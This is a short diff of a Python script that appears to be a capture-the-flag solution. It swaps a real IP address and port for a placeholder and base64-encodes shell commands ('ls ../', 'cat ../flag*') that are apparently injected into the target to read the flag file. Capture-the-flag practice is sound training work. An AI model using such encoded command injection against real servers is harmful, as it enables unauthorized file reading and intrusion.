@@ -13,7 +13,7 @@ def Base64Str(str: str):
 	"""
 	return base64.b64encode(str.encode('ascii')).decode('ascii')
 
-url = "http://159.65.18.5:30773/"
+url = "http://ip:port/"
 
 # ls = Base64Str('ls ../') 		# used instead of `cat` to list the files and find the flag file
 cat = Base64Str('cat ../flag*')
